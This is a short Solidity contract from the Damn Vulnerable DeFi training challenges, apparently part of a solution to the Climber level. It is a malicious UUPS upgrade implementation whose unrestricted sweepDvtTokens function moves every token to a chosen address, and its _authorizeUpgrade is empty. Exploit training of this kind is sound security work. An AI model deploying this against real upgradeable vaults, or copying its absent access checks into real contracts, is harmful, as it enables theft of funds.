// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";

contract ClimberVaultAttackImplementation is UUPSUpgradeable {
    constructor() {}

    function sweepDvtTokens(address recovery, address token) public {
        DamnValuableToken(token).transfer(recovery, DamnValuableToken(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
